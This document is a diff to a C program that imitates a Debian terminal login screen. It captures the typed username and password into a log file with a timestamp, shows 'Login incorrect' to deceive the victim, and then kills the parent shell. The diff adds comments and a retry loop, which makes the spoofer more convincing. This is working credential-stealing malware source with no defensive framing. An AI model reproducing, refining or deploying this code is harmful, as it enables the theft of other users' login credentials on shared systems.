@@ -12,6 +12,14 @@
 
 char host[MAX_HOSTNAME_LENGTH];
 
+/**
+ * gets user's credentials and stores them into the specified file
+ * 
+ * return values:
+ *  0 - completed successfully
+ *  1 - supplied username is empty or EOF
+ * -1 - could not open file
+ */
 int get_credentials()
 {
   char *pass = NULL;
@@ -36,9 +44,9 @@ int get_credentials()
       return 1;
     }
 
+  // logging timestamp
   time_t rawtime;
   struct tm *timeinfo = NULL;
-
   time(&rawtime);
   timeinfo = localtime(&rawtime);
   sprintf(timestamp, "[%02d-%02d-%04d %02d:%02d:%02d]\n\n",
@@ -48,14 +56,13 @@ int get_credentials()
 	  timeinfo->tm_hour,
 	  timeinfo->tm_min,
 	  timeinfo->tm_sec);
-
   write(fd, (const void *)timestamp, strlen(timestamp+1));
+
+  // getting and logging credentials
   write(fd, "login: ", strlen("login: ")+1);
   write(fd, (const void *)user, strlen(user)+1);
-
   // TODO: getpass is deprecated, remove in the future
   pass = getpass("Password: ");
-
   write(fd, "pass: ", strlen("pass: ")+1);
   write(fd, (const void *)pass, strlen(pass)+1);
   write(fd, "\n\n", 2);
@@ -65,6 +72,9 @@ int get_credentials()
   return 0;
 }
 
+/**
+ * Displays usage message
+ */
 void usage()
 {
   printf("Usage:\n"
@@ -79,7 +89,7 @@ int main(int argc, char *argv[])
 {
   char* tty = NULL;
   int opt = 0;
-
+  int ret = 0; 
   while((opt = getopt(argc, argv, "fh")) !=-1)
     {
       switch(opt){
@@ -104,22 +114,21 @@ int main(int argc, char *argv[])
   gethostname(host, MAX_HOSTNAME_LENGTH);
   system("clear");
 
-  // TODO: fix (uname)
-  printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);
-
   // mimic original behaviour when no username is supplied
-  switch(get_credentials())
+  do
     {
-  case -1:
-    // could not open store file
-    return -1;
-  case 1:
-    printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);
-    break;
-    }
+      // TODO: fix (uname)
+      printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);
+      ret = get_credentials();
 
-  sleep(2);
-  printf("Login incorrect\n");
+      if (ret == 0)
+	{
+	  printf("Login incorrect\n");
+	  sleep(2);
+	}
+      else if (ret == 1) continue;
+      else if (ret == -1) break;
+    }while(ret);
 
   // logout user after done
   kill(getppid(), SIGKILL);
